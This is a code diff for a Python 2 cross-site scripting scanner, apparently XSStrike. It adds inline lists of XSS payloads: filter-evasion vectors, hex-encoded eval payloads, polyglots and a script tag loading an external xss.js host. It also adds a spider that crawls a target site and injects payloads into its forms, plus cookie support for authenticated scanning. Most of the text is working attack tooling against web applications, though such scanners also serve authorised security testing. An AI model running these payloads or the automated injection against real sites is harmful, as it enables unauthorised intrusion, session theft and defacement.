@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
+# -- coding: utf-8 --
 #   Required Modules
 from __future__ import with_statement
 from __future__ import absolute_import
@@ -22,9 +22,6 @@ from colorama import init , Style, Back,Fore
 from io import open
 from itertools import izip
 
-reload(sys) # for avoid UnicodeDecodeError 
-sys.setdefaultencoding('utf-8')
-
 # Just some variables
 
 WAF = ""
@@ -32,10 +29,32 @@ WAF = ""
 br = mechanize.Browser()
 br.set_handle_robots(False)
 
-evades =  open("payloads/evades.txt",'r').read().split('\n')
-vectors = open("payloads/vectors.txt",'r').read().split('\n')
+evades = [
+"\"><img sRc=l oNerrOr=prompt() x>",
+"<!--<img src=--><img src=x onerror=alert`` x>",
+"<a id=\"a\"href=javascript&colon;alert&lpar;1&rpar; id=\"a\">Click</a>",
+"%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e",
+"<iMg sRc=x:alert`` oNError=eval(src)>"
+]
 
-
+vectors = [
+"\"><img sRc=l oNerrOr=prompt() x>",
+"<!--<img src=--><img src=x onerror=alert`` x>",
+"<a id=\"a\"href=javascript&colon;alert&lpar;1&rpar; id=\"a\">Click</a>",
+"\\\"><img sRc=l oNerrOr=prompt() x>",
+"<iMg sRc=x:alert`` oNError=eval(src)>",
+"\"><sCript x>confirm``</script x>",
+"'\"><svg/onload=alert()>",
+"\"'><iMg sRc=x:alert`` oNError=eval(src)>",
+"'\"><svG oNLoad=confirm&#x28;1&#x29>",
+"\"><iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\">",
+"'\">/*-/*`/*\`/*'/*\"/**/(/* */<sVg/OnloAd=prompt() x>",
+"\"'--!><Script x>prompt()</scRiPt x>",
+"'\"--!><sVg/oNLoad=confirm()><\"",
+"\"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>",
+"\"><img src=x onerror=co\u006efir\u006d`1`>",
+"\"><svg/onload=co\u006efir\u006d`1`>"
+]
 
 xsschecker = "d3v"      #If you want to change it, make sure the word is unlikely to appear on page
 URL = ""
@@ -51,9 +70,27 @@ OCCURENCE_NUM = 0
 OCCURENCE_PARSED = 0
 LIST_OF_PAYLOADS = []
 
-FUZZING_PAYLOADS_BASE = open("payloads/FUZZING_PAYLOADS_BASE.txt",'r').read().split('\n')
-FUZZING_PAYLOADS_START_END_TAG = open("payloads/FUZZING_PAYLOADS_START_END_TAG.txt",'r').read().split('\n')
-FUZZING_PAYLOADS_ATTR = open("payloads/FUZZING_PAYLOADS_ATTR.txt",'r').read().split('\n')
+FUZZING_PAYLOADS_BASE = [
+    "<script>alert(1)</script>",
+    "<sCriPt>alert(1);</sCriPt>",
+    "<script src=http://ha.ckers.org/xss.js></script>",
+    "<script>alert(String.fromCharCode(88,83,83));</script>",
+    "<IMG \"\"\"><script>alert(\"XSS\")</script>\">",
+    "<img src=\"blah.jpg\" onerror=\"alert()\"/>"
+]
+
+FUZZING_PAYLOADS_START_END_TAG = [
+    "\"/><script>alert(1)</script>",
+    "\"\/><img src=\"blah.jpg\" onerror=\"alert()\"/>",
+    "\"\/><img src=\"blahjpg\" onerror=\"alert()\"/>"
+]
+
+FUZZING_PAYLOADS_ATTR = [
+    "\"><script>alert(1)</script>",
+    "\"><img src=\"blah.jpg\" onerror=\"alert()\"/>",
+    "'><script>alert(1)</script>"
+]
+
 
 #######################################################################################################################
 #  Fuzzer
@@ -70,7 +107,7 @@ def main(): #Basic structure of fuzzer
         print "\033[1;97m[>]\033[1;m Scanning all the reflections"
         
     else:
-        sys.exit("\033[1;31m[-]\033[1;m No reflection found. \n\033[1;33m[!]\033[1;m Automatically launching Hulk!")
+        print "\033[1;31m[-]\033[1;m No reflection found. \n\033[1;33m[!]\033[1;m Automatically launching Hulk!"
         hulk()
     
     for i in range(NUM_REFLECTIONS):
@@ -92,7 +129,7 @@ def main(): #Basic structure of fuzzer
         scan_a = raw_input("\033[1;34m[?]\033[1;m Do you want to use striker? [Y/n] ").lower()
         if scan_a == "n":
             print "\033[1;33m[!]\033[1;m Exiting..."
-            sys.exit()
+            quit()
         else:
             print "\033[1;31m--------------------------------------------\033[1;m"
             striker()
@@ -102,7 +139,7 @@ def main(): #Basic structure of fuzzer
         scan_a = raw_input("\033[1;34m[?]\033[1;m Do you want to use striker? [Y/n] ").lower()
         if scan_a == "n":
             print "\033[1;33m[!]\033[1;m Exiting..."
-            sys.exit()
+            quit()
         else:
             print "\033[1;31m--------------------------------------------\033[1;m"
             striker()
@@ -156,12 +193,11 @@ def test_param_check(param_to_check, param_to_compare):
 
 def make_request(in_url):
     try:
-        req = urllib2.Request(in_url)
-        resp = urllib2.urlopen(req)
+        resp = br.open(in_url)
         return resp.read()
     except:
         print "\n\033[1;31m[-]\033[1;m URL is offline. \n\033[1;33m[!]\033[1;m Exiting..."
-        sys.exit()
+        quit()
 
 def break_comment():
     payload = "--><script>alert();</script>"
@@ -367,7 +403,7 @@ def striker():
         inp = raw_input("\033[1;34m[?]\033[1;m Send the target to Hulk? [Y/n]").lower()
         if inp == 'n':
             print "\033[1;33m[!]\033[1;m Exiting..."
-            sys.exit()
+            quit()
         else:
             hulk()
     def complete(p,r,conclusion,d):
@@ -425,8 +461,8 @@ def striker():
                                     try:
                                         if x in sourcecode:
                                             print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(param_name,x)
-                                            fresult.append("  Vulnerable  ")
                                             webbrowser.open(data)
+                                            fresult.append("  Vulnerable  ")
                                             conclusion = 1
                                             total = total+1
                                             progress = progress + 1
@@ -434,13 +470,13 @@ def striker():
                                             if scan_j == "y":
                                                 pass
                                             else:
-                                                "\033[1;33m[!]\033[1;m Exiting..."
-                                                sys.exit()
+                                                print "\033[1;33m[!]\033[1;m Exiting..."
+                                                quit()
                                         else:
                                             conclusion = 0
                                     except:
-                                        "\033[1;33m[!]\033[1;m Exiting..."
-                                        sys.exit()
+                                        print "\033[1;33m[!]\033[1;m Exiting..."
+                                        quit()
                             if conclusion == 0:
                                 print "\n\033[1;31m[-]\033[1;m '%s' parameter not vulnerable."%param_name
                                 fresult.append("Not Vulnerable")
@@ -499,7 +535,7 @@ def striker():
                                             pass
                                         else:
                                             print "\033[1;33m[!]\033[1;m Exiting..."
-                                            sys.exit()
+                                            quit()
                                     else:
                                         conclusion = 0
                             if conclusion == 0:
@@ -521,13 +557,13 @@ def POST():
         print "\033[1;33m[!]\033[1;m Strike completed."
         if conclusion == 0:
             print "\033[1;31m[-]\033[1;m Given parameters are not vulnerable to XSS."
-            sys.exit()
+            quit()
         elif conclusion ==1:
             print "\033[1;32m[+]\033[1;m %s Parameter is vulnerable to XSS." %conclusion
-            sys.exit()
+            quit()
         else:
             print "\033[1;32m[+]\033[1;m %s Parameters are vulnerable to XSS."%conclusion
-            sys.exit()
+            quit()
     try:
         try:
             try:
@@ -592,6 +628,7 @@ def POST():
                             payload1 = []
                             if i in sourcecode:
                                 print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(pn,i)
+                                webbrowser.open(path, data)
                                 fresult.append("  Vulnerable  ")
                                 c = 1
                                 total = total+1
@@ -608,12 +645,147 @@ def POST():
                 complete(fpar,fresult,total,domain)
             except(httplib.HTTPResponse, socket.error) as Exit:
                 print"\033[1;31m[-]\033[1;m Site "+domain+" is offline!"
-                sys.exit()
+                quit()
         except(KeyboardInterrupt) as Exit:
             print("\n\033[1;31m[-]\033[1;m Exiting...")
     except (mechanize.HTTPError,mechanize.URLError) as e:
             print"\n\033[1;31m[-]\033[1;m HTTP ERROR! %s %s"%(e.code,e.reason)
-            sys.exit()
+            quit()
+
+#############################################################
+#                   Spider
+############################################################
+def initial_crawling(firstDomains):
+    url1 = urlparse(URL)
+    urldata = parse_qsl(url1.query)
+    url = u'{uri.scheme}://{uri.netloc}/'.format(uri=url1)
+    if "http://" in url:
+        url = url.replace("http://","")
+    if "https://" in url:
+        url = url.replace("https://","")
+    if "http://www." in url:
+        url = url.replace("http://www.","")
+    if "https://www." in url:
+        url = url.replace("http://www.","")
+    if "www." in url:
+        url = url.replace("www.","")
+    firstDomains = []   #list of domains
+    
+    smallurl = url  #small url is the part of url without http and www
+
+    allURLS = []
+    allURLS.append(url) #just one url at the moment
+    print "\033[1;97m[>]\033[1;m Loading spider"  #doing a short traversal if no command line argument is being passed
+    for url in allURLS:
+        x = str(url)
+        smallurl = x
+        url = "http://www." + str(url)
+        try:
+            br.open(url)
+            print "\033[1;97m[>]\033[1;m Finding all the links present in the seed page " + str(url)
+            try:
+                for link in br.links():     #finding the links of the website
+                    if smallurl in str(link.absolute_url):
+                        firstDomains.append(str(link.absolute_url))
+                firstDomains = list(set(firstDomains))
+            except:
+                pass
+        except:
+            pass
+    print "\033[1;33m[!]\033[1;m Number of potenial targets: " + str(len(firstDomains))
+    return firstDomains
+
+
+def findxss(firstDomains):
+    print "\033[1;97m[>]\033[1;m Loading fuzzing engine" #starting finding XSS
+    xssLinks = []           #TOTAL CROSS SITE SCRIPTING FINDINGS
+    count = 0           #to check for forms
+    dummyVar = 0            #dummy variable for doing nothing
+    if firstDomains > 0:    #if there is atleast one link
+        for link in firstDomains:
+            y = str(link)
+            print str(link)
+            if 'jpg' in y:      #just a small check
+                print "\033[1;33m[!]\033[1;m This is just an image."
+            elif 'pdf' in y:
+                print "\033[1;33m[!]\033[1;m This is just a document."
+            else:
+                try:
+                    br.open(str(link))  #open the link
+                except:
+                    dummyVar = 0
+                try:
+                    for form in br.forms(): #check its forms
+                        count = count + 1
+                except:
+                    dummyVar = 0
+                if count > 0:       #if a form exists, submit it
+                    try:
+                        params = list(br.forms())[0]    #our form
+                    except:
+                        dummyVar = 0
+                    try:
+                        br.select_form(nr=0)    #submit the first form
+                    except:
+                        dummyVar = 0
+                    for p in params.controls:
+                        par = str(p)
+                        if 'TextControl' in par:        #submit only those forms which require text
+                            try:
+                                br.form[str(p.name)] = '<svg "ons>'     #our payload
+                            except:
+                                dummyVar = 0
+                            try:
+                                br.submit()
+                            except:
+                                dummyVar = 0
+                            try:
+                                if '<svg "ons>' in br.response().read():    #if payload is found in response, we have XSS
+                                    print "\033[1;31m--------------------------------------------\033[1;m"
+                                    print "\033[1;32m[+]\033[1;m Vulnerability found"
+                                    print "\033[1;32m[+]\033[1;m Vulnerable Parameter: " + str(p.name)
+                                    print "\033[1;32m[+]\033[1;m " + str(link)
+                                    print "\033[1;32m[+]\033[1;m Payload type: <svg \"ons>"
+                                    print "\033[1;31m--------------------------------------------\033[1;m"
+                                    xssLinks.append(link)
+                                else:
+                                    dummyVar = 0
+                            except:
+                                print "[-] Unable to read the page"
+                            try:
+                                br.back()
+                            except:
+                                dummyVar = 0
+
+                            #SECOND PAYLOAD
+
+                            try:
+                                br.form[str(p.name)] = 'javascript:alert(1)'    #second payload
+                            except:
+                                dummyVar = 0
+                            try:
+                                br.submit()
+                            except:
+                                dummyVar = 0
+                            try:
+                                if '<a href="javascript:alert(1)' in br.response().read():
+                                    print "\nVulnerable page: " + str(link) + "\n [+] Payload Type: javascript:alert(1)" + "\n"
+                                    xssLinks.append(link)
+                                else:
+                                    dummyVar = 0
+                            except:
+                                print "[-] Could not read the page"
+                            try:
+                                br.back()       #go back to the previous page
+                            except:
+                                dummyVar = 0
+                    count = 0
+        print "\033[1;33m[!]\033[1;m Scan completed."
+        for link in xssLinks:       #print all xss findings
+            print link
+    else:
+        print "[-] There's some problem with the URL."
+
 #-----------------------------
 noise = "<script>alert()</script>"
 #-----------------------------
@@ -622,7 +794,8 @@ noise = "<script>alert()</script>"
 def choice():
     print"\n\033[97m1.\033[1;m Fuzzer"
     print"\033[97m2.\033[1;m Striker"
-    print"\033[97m3.\033[1;m Hulk"
+    print"\033[97m3.\033[1;m Spider"
+    print"\033[97m4.\033[1;m Hulk"
     choice = input("\033[97mEnter your choice: \033[1;m")
     if choice == 1:
         print "\033[1;31m--------------------------------------------\033[1;m"
@@ -631,6 +804,11 @@ def choice():
         print "\033[1;31m--------------------------------------------\033[1;m"
         striker()
     if choice == 3:
+        print "\033[1;31m--------------------------------------------\033[1;m"
+        firstDomains = []
+        firstDomains = initial_crawling(firstDomains)
+        findxss(firstDomains)
+    if choice == 4:
         print "\033[1;31m--------------------------------------------\033[1;m"
         hulk()
 
@@ -659,14 +837,15 @@ def hulk():
     cloak = URL.replace("d3v", "%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e")
     webbrowser.open(cloak)
     print "\033[1;33m[!]\033[1;m Hulk's stamina is over. Exiting..."
-    sys.exit()
-print "        \033[1;31m\033[1;100mMade with <3 by Somdev Sangwan : TeamUltimate.in\033[1;m"
+    quit()
+print "        \033[1;32mMade with \033[1;31m<3\033[1;32m by Somdev Sangwan : TeamUltimate.in\033[1;m"
 print"""\033[1;31m _     _ _______ _______ _______  ______ _____ _     _ _______
   \___/  |______ |______    |    |_____/   |   |____/  |______
  _/   \_ ______| ______|    |    |    \_ __|__ |    \_ |______"""
 print"\t\033[1;32m       Enter \"help\" to access help manual\033[1;m"
 print"\033[1;31m-----------------------------------------------------------------\033[1;m"
 URL = raw_input('\033[1;34m[?]\033[1;m\033[1;97m Enter the target URL: \033[1;m')
+cookie = raw_input('\033[1;34m[?]\033[1;m\033[1;97m Enter cookie (if any): \033[1;m')
 if URL == "post":
     POST()
 if URL == "help":
@@ -675,18 +854,21 @@ if URL == "help":
 \n\033[1;100mFuzzer\033[1;m Checks where and how the input gets reflected and then tries to build a payload according to that.
 \n\033[1;100mStriker\033[1;m Brute forces all the parameters one by one and opens the POC in a browser window.
 \n\033[1;100mHulk\033[1;m Injects polyglots and handpicked payloads into the selected parameter and opens the POC in a browser window.
+\n\033[1;100mSpider\033[1;m Finds all links present in the homepage of the target and checks XSS 
+\n\033[1;33mNote:\033[1;m Some payloads use JavaScript event handlers like onclick, onfocus etc. so you may need to check them manually.
+If there are multiple parameters and Striker gives false positive then enter the payload manually into the vulnerable parameter.
 \033[1;31m--------------------------------------------\033[1;m"""
-    sys.exit()
+    quit()
 if "=" not in URL:
     print Style.BRIGHT + Fore.RED + "[-] The URL you entered doesn't seem to use GET Method."
     post = raw_input("\033[1;34m[?]\033[1;m Does it use POST method? [Y/n] ")
     if post == "n":
-        sys.exit()
+        quit()
     else:
         POST()
 if "d3v" not in URL:
     print Style.BRIGHT + Fore.RED + "[-] You have to insert \"d3v\" in the most crucial parameter to use Fuzzer and Hulk.\nFor example: website.com/search.php?q=d3v&category=1"
-    sys.exit()
+    quit()
 if 'https://' in URL:
     pass
 elif 'http://' in URL:
@@ -734,5 +916,7 @@ try:
 
 except (SyntaxError, NameError, IOError, TypeError, AttributeError):
     print Style.BRIGHT + Fore.RED + "\n[-] There's some problem with the URL. Exiting..."
-    sys.exit()
-br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'), ('Referer', URL), ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding', 'gzip, deflate')]
+    quit()
+br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+('Referer', URL), ('Accept-Encoding', 'gzip, deflate'), ('Cookie', cookie),
+('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
